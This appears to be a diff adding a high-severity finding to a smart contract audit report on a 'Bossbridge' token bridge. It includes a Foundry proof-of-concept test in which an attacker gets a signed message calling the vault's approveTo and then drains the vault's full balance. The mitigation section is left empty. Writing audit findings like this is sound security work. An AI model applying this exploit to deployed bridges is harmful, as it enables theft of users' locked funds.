@@ -60,3 +60,41 @@
             );
     }
 ```
+
+# [H-2] Any user is able to call `Bossbridge -> Vault::ApproveTo` to take control over an amount of tokens, in order to drain vault balance.
+
+**Description:** There's no regulation about what kind of messages a signer can sign, it's just a request so as to get a valid signature to redeem L2 tokens into L1, users can leverage it to drain funds.
+
+**Impact:** the following vulnerabilty catches the attention of malicious users due to the facility oo draining all funds locked in a vault.
+
+**Proof of concept:**
+
+```javascript
+
+    function testMaliciousMessageSignatures() public {
+        uint256 vaultInitialBalance = 100e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        address attacker = makeAddr("attacker");
+
+        bytes memory message = abi.encode(
+            address(vault),
+            0,
+            abi.encodeCall(vault.approveTo, (attacker, vaultInitialBalance))
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        vm.prank(attacker);
+        token.transferFrom(address(vault), attacker, vaultInitialBalance);
+
+        uint256 attackerBalance = token.balanceOf(attacker);
+        uint256 vaultEndingBalance = token.balanceOf(address(vault));
+
+        assertEq(attackerBalance, vaultInitialBalance);
+        assertEq(vaultEndingBalance, 0);
+    }
+```
+
+**Recommened Mitigation:**
